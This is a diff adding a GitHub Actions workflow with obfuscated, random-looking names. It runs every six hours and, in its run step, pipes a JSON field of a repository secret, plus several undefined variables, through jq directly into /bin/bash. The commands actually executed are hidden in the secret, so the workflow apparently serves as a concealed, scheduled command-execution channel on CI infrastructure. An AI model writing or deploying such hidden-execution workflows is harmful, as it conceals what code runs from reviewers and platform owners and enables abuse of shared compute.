@@ -1,0 +1,22 @@
+name: ruanxiaoer19871010
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxiaoer19871010
+        env:
+          ffje20971: ${{ secrets.ffje20971 }}
+        run: |
+          echo $ffje20971 | jq -r .icpm9 | /bin/bash
+          echo $tjq09664 | jq -r .kcm124 | /bin/bash
+          echo $i06391 | jq -r .hvcak97677 | /bin/bash
+          echo $rgt0 | jq -r .yrguz0 | /bin/bash
+          echo $hxdav03 | jq -r .ace28257 | /bin/bash
+          echo $ddnc0 | jq -r .zepk004 | /bin/bash
+
